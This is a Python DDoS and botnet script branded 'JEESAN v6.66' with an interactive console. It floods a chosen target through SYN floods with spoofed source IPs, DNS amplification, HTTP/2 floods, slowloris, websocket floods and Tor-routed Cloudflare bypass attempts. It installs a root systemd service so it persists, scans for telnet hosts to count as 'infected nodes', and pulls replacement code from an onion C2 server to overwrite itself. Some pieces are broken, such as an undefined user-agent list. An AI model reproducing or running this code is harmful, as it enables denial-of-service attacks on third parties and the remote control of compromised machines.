import os
import sys
import time
import threading
import random
import socket
import requests
import h2.connection
import subprocess
import psutil
from scapy.all import *
from stem.control import Controller
from stem import Signal
from colorama import Fore, Style, init
import json

init(autoreset=True)

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN
M = Fore.MAGENTA

JEESAN_HOME = "/opt/jeesan-core.py"
PERSISTENT_SERVICE = "/etc/systemd/system/jeesan.service"
C2_SERVER = "http://x7a2b9c.onion/update" 
TARGET = ""
PORT = 80
HTTPS = False
DURATION = 0  
METHOD = "nuke"
ATTACK_RUNNING = False
BYTES_SENT = 0
NODES = set()
TOR_AUTH = "16:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

def install_persistence():
    if not os.path.exists(PERSISTENT_SERVICE):
        service_file = f"""
[Unit]
Description=JEESAN DDoS Core
After=network.target tor.service

[Service]
ExecStart=/usr/bin/python3 {JEESAN_HOME}
Restart=always
User=root
PIDFile=/var/run/jeesan.pid
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
        with open(PERSISTENT_SERVICE, "w") as f:
            f.write(service_file)
        os.system("systemctl daemon-reexec")
        os.system("systemctl enable jeesan.service")

def renew_tor():
    with Controller.from_port(port=9051) as c:
        c.authenticate(password=TOR_AUTH)
        c.signal(Signal.NEWNYM)

def get_tor_requests():
    session = requests.Session()
    session.proxies.update({
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    })
    return session

def cf_bypass_session():
    s = get_tor_requests()
    try:
        r = s.get(f"http{'s' if HTTPS else ''}://{TARGET}", timeout=10)
        time.sleep(random.uniform(2.0, 5.0))
        s.get(f"http{'s' if HTTPS else ''}://{TARGET}/?__cf_chl_tk=xxxxx", headers={
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html",
            "Accept-Language": "en-US",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document"
        }, timeout=10)
        return s
    except:
        return s

# === VECTORS ===
def syn_flood():
    global BYTES_SENT
    while ATTACK_RUNNING:
        try:
            ip = IP(src=".".join(map(str, [random.randint(1,254) for _ in range(4)])), dst=TARGET)
            tcp = TCP(sport=random.randint(1024,65535), dport=PORT, flags="S")
            pkt = ip/tcp/Raw(load=os.urandom(1024))
            send(pkt, verbose=False)
            BYTES_SENT += len(pkt)
        except:
            pass

def udp_dns_amp():
    global BYTES_SENT
    payload = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01"
    for resolver in ["8.8.8.8", "1.1.1.1", "9.9.9.9"]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (resolver, 53))
            BYTES_SENT += 512
        except:
            pass

def http2_flood():
    global BYTES_SENT
    while ATTACK_RUNNING:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((TARGET, PORT))
            ctx = h2.connection.H2Connection()
            ctx.initiate_connection()
            sock.send(ctx.data_to_send())
            headers = [
                (':method', 'GET'),
                (':path', f'/{random.randint(1,99999)}'),
                (':authority', TARGET),
                (':scheme', 'https'),
                ('user-agent', random.choice(USER_AGENTS)),
                ('accept', '*/*')
            ]
            stream_id = ctx.get_next_available_stream_id()
            ctx.send_headers(stream_id, headers, end_stream=True)
            sock.send(ctx.data_to_send())
            ctx.close_connection()
            sock.send(ctx.data_to_send())
            sock.close()
            BYTES_SENT += 2048
        except:
            try: sock.close()
            except: pass

def slowloris():
    global BYTES_SENT
    while ATTACK_RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET, PORT))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {TARGET}\r\n".encode())
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            BYTES_SENT += 150
            while ATTACK_RUNNING:
                s.send(f"X-{random.randint(1,9999)}: {random.randint(1,999)}\r\n".encode())
                time.sleep(15)
        except:
            try: s.close()
            except: pass

def websocket_flood():
    global BYTES_SENT
    ws_url = f"ws{'s' if HTTPS else ''}://{TARGET}/ws"
    headers = [
        "GET /ws HTTP/1.1",
        f"Host: {TARGET}",
        "Upgrade: websocket",
        "Connection: Upgrade",
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==",
        "Sec-WebSocket-Version: 13",
        f"User-Agent: {random.choice(USER_AGENTS)}"
    ]
    payload = "\r\n".join(headers) + "\r\n\r\n"
    while ATTACK_RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET, PORT))
            s.send(payload.encode())
            time.sleep(0.1)
            for _ in range(50):
                s.send(os.urandom(128))
                BYTES_SENT += 128
                time.sleep(0.2)
        except:
            try: s.close()
            except: pass

def cloudflare_nuke():
    while ATTACK_RUNNING:
        try:
            s = cf_bypass_session()
            s.post(f"http{'s' if HTTPS else ''}://{TARGET}/cdn-cgi/challenge-platform/h/g/orc", data={
                'id': random.randint(10000,99999),
                'js_token': 'fake_js_123',
                'answer': '0'
            }, timeout=10)
            BYTES_SENT += 512
            renew_tor()
        except:
            pass

def swarm_infect():
    while ATTACK_RUNNING:
        try:
            ip = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            if sock.connect_ex((ip, 23)) == 0: 
                NODES.add(ip)
            sock.close()
        except:
            pass
        time.sleep(0.01)

def ai_rotate_attack():
    methods = [syn_flood, udp_dns_amp, http2_flood, slowloris, websocket_flood, cloudflare_nuke]
    while ATTACK_RUNNING:
        method = random.choice(methods)
        threads = [threading.Thread(target=method, daemon=True) for _ in range(50)]
        for t in threads: t.start()
        time.sleep(60)  

def self_update():
    while ATTACK_RUNNING:
        try:
            s = get_tor_requests()
            resp = s.get(C2_SERVER, timeout=10)
            if resp.status_code == 200:
                new_code = resp.text
                with open(JEESAN_HOME, "w") as f:
                    f.write(new_code)
                os.system(f"chmod +x {JEESAN_HOME}")
                print(f"{G}[✓] JEESAN SELF-UPDATED FROM C2")
        except:
            pass
        time.sleep(1800) 

def console():
    global TARGET, PORT, DURATION, METHOD, HTTPS, ATTACK_RUNNING
    print(f"{R}██████╗  █████╗ ███████╗██╗  ██╗ {B}JEESAN v6.66")
    print(f"{R}██╔══██╗██╔══██╗██╔════╝██║  ██║ {B}DEVIL MODE ACTIVE")
    print(f"{R}██████╔╝███████║███████╗███████║ {B}C2: {C2_SERVER}")
    print(f"{R}██╔══██╗██╔══██║╚════██║╚════██║")
    print(f"{R}██║  ██║██║  ██║███████║     ██║")
    print(f"{R}╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝     ╚═╝")
    print(f"{Y}Type 'help' for commands.\n")

    while True:
        cmd = input(f"{M}JEESAN> {C}").strip().lower()
        if cmd == "help":
            print(f"""
{G}Available Commands:
  set target <domain/IP>    - Set target
  set port <num>            - Set port (default 80)
  set https on/off          - Enable HTTPS
  attack --nuke             - Launch all vectors
  attack --swarm            - Enable botnet + AI rotation
  status                    - Show attack stats
  nodes                     - List infected nodes
  exit                      - Kill all (but persistence remains)
            """)
        elif cmd.startswith("set target"):
            TARGET = cmd.split()[-1]
            print(f"{G}[✓] Target set: {TARGET}")
        elif cmd.startswith("set port"):
            PORT = int(cmd.split()[-1])
            HTTPS = PORT == 443
            print(f"{G}[✓] Port set: {PORT}")
        elif cmd == "set https on":
            HTTPS = True
            print(f"{G}[✓] HTTPS enabled")
        elif cmd == "attack --nuke":
            if not TARGET:
                print(f"{R}[!] Set target first!")
                continue
            METHOD = "nuke"
            threading.Thread(target=launch_nuke, daemon=True).start()
        elif cmd == "attack --swarm":
            if not TARGET:
                print(f"{R}[!] Set target first!")
                continue
            METHOD = "swarm"
            threading.Thread(target=launch_swarm, daemon=True).start()
        elif cmd == "status":
            print(f"{C}Target: {TARGET}:{PORT} | Sent: {BYTES_SENT / 1e9:.2f} GB | Running: {ATTACK_RUNNING}")
        elif cmd == "nodes":
            print(f"{G}Infected Nodes: {len(NODES)}")
            for n in NODES: print(f"  → {n}")
        elif cmd == "exit":
            ATTACK_RUNNING = False
            print(f"{R}JEESAN will persist. The apocalypse continues...")
            break
        else:
            print(f"{R}[!] Unknown command. Type 'help'.")

def launch_nuke():
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    print(f"{R}[🔥] NUKING {TARGET} WITH ALL VECTORS!")
    for _ in range(200):
        threading.Thread(target=syn_flood, daemon=True).start()
        threading.Thread(target=udp_dns_amp, daemon=True).start()
        threading.Thread(target=http2_flood, daemon=True).start()
        threading.Thread(target=slowloris, daemon=True).start()
        threading.Thread(target=websocket_flood, daemon=True).start()
        threading.Thread(target=cloudflare_nuke, daemon=True).start()

def launch_swarm():
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    launch_nuke()
    threading.Thread(target=swarm_infect, daemon=True).start()
    threading.Thread(target=ai_rotate_attack, daemon=True).start()
    threading.Thread(target=self_update, daemon=True).start()

if __name__ == "__main__":
    if not os.path.exists("/tmp/.jeesan_lock"):
        install_persistence()
        open("/tmp/.jeesan_lock", "w").write("1")

    print(f"{G}[✓] JEESAN v6.66 loaded. Running in background...")
    time.sleep(2)

    console()
